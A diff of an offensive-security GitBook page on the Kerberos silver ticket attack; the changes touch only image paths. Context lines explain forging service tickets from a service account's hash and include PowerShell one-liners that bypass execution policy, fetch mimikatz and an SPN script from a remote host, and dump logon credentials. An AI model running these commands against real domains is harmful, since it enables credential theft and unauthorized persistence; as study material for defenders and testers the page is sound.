@@ -6,7 +6,7 @@ Silver ticket attack is one of the ways to gain domain persistence. Once you hav
 
 On the last step of the process when the client sends a TGS to the service that is where we can send a forged TGS and get access directly to the service and get a service ticket using this method.
 
-![](../../../../.gitbook/assets/image%20%28191%29.png)
+![](../../../.gitbook/assets/image%20%28191%29.png)
 
 #### Silver ticket abuses the part of Kerberos authentication where a client sends a Valid TGS to get a service ticket. So if an attacker knows the hash of the service account he can forge a fake service ticket with it. Kerberos will trust it since it can be decrypted by the service as its signed by the NTLM hash of the service.
 
@@ -26,7 +26,7 @@ If an attacker can gain admin rights to the computer \(to gain debug access\) or
 powershell -ep bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/mimikatz.ps1'); invoke-mimikatz -command 'sekurlsa::logonpasswords'"
 ```
 
-![](../../../../.gitbook/assets/image%20%28189%29.png)
+![](../../../.gitbook/assets/image%20%28189%29.png)
 
 **Target** – This is the host, which can be copied from the SPN value. 
 
@@ -34,7 +34,7 @@ powershell -ep bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('
 powershell -ep bypass -c "iex(new-object system.net.webclient).downloadstring('http://192.168.56.1/getspn.ps1')"
 ```
 
-![](../../../../.gitbook/assets/image%20%28186%29.png)
+![](../../../.gitbook/assets/image%20%28186%29.png)
 
 ## Forging Silver Ticket
 
@@ -72,7 +72,7 @@ By issuing a klist command you can see that we now have the ticket for sql servi
 
  
 
-![](../../../../.gitbook/assets/image%20%28190%29.png)
+![](../../../.gitbook/assets/image%20%28190%29.png)
 
 
 
